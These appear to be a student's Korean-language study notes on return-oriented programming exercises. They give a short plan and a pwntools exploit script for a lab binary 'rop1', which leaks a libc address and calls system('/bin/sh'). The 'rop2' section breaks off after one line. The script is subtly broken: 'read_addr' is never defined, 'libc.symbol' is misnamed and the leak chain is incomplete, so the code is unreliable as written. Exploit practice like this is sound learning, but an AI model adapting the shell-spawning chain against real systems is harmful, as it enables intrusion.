# 6주차

## rop1

You can use read, write  
먼저 write 함수를 이용하여 read 함수의 실제 주소를 알아내고, 이를 이용하여 libc_leak을 한다. system 함수와 '/bin/sh'의 주소를 구한 뒤 그것을 실행하도록 한다.  
필요한 gadget은 pop3_ret


```python
from pwn import *

p = process("./rop1")
e = ELF("./rop1")
libc = e.libc

pop_ret = 0x08049022
pop3_ret = 0x08049381
read_plt = 0x080490b0
read_got = 0x0804bfd4
write_plt = 0x08049100
write_got = 0x0804bfe8


payload = b'A'*0x40
payload += b'B'*0x4
payload += p32(pop_ret)
payload += p32(read_got)
payload += p32(write_plt)
payload += p32(8)




libc_base = read_addr - libc.symbol['read']
system_addr = libc_base + libc.symbol['system']
binsh = libc_base + list(libc.search(b'/bin/sh'))[0]

payload += p32(system_addr)
payload += b'C'*0x4
payload += p32(binsh)

p.send(payload)

p.interactive()

```


## rop2

gets and puts  
일단 우리는...



